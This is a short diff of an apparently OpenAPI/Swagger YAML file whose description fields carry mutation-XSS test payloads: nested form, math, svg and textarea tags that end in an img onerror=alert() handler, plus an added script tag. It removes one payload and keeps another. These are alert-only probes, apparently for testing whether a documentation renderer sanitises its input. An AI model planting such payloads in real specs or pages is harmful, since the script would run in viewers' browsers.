@@ -5,14 +5,16 @@ info:
     <form>
         <math>
             <mtext>
+                <script>
+                    console.log("alertaaaaa")
+                </script>
     </form>
     <form>
         <mglyph>
             <svg>
                 <mtext>
-                    <textarea>
-                        <path id="</textarea>
-                            <img onerror=alert('Olá teste') src=1>">
+                    <textarea> <path id="</textarea> 
+                    <img onerror=alert('Olá teste') src=1>">
                         
     </form>
 
@@ -40,7 +42,11 @@ paths:
     delete:
       parameters:
         - description: |
-            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert('CarlosTuma') src=1>"></form>
+            <form>
+                <textarea> 
+                    <path id="" />
+                </textarea> 
+            </form>
 
           format: int64
           in: path
